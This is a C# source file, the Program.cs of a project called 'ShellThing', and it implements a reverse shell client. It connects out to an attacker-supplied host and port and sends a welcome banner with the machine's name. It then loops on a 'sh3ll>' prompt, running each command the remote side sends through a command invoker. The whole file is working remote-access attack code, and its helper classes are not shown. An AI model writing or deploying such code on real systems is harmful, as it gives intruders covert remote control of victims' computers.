using System;
using System.Collections.Generic;

namespace ShellThing
{
    class Program
    {
        static TcpReverseConnection connection;
        static readonly string prompt = "sh3ll> ";

        static void Main(string[] args)
        {
            if(args.Length != 2)
            {
                //TODO - Throw an exception or just terminate instead of writing to console
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error - Incorrect Number of arguments");
                Console.ResetColor();
            }
            else
            {
                connection = new TcpReverseConnection();
                connection.StartClient(args[0], args[1]);

                // Initialize invoker which sets commands in its constructor
                CommandInvoker commandInvoker = new CommandInvoker(connection);

                connection.SendData($"Connected! Welcome to {Environment.MachineName}\nType 'help' to see available commands\n");

                while(connection.IsConnected)
                {
                    connection.SendData(prompt);
                    // TODO: try/catch for ctrl+c close of connection - maybe attempt reconnect??
                    string commandReceived = connection.ReceiveData();

                    try
                    {
                        commandInvoker.ParseCommandReceived(commandReceived);
                    }
                    catch (Exception e)
                    {
                        connection.SendData($"Exception: {e.Message}");
                    }
                    
                }
            }
        }
    }
}
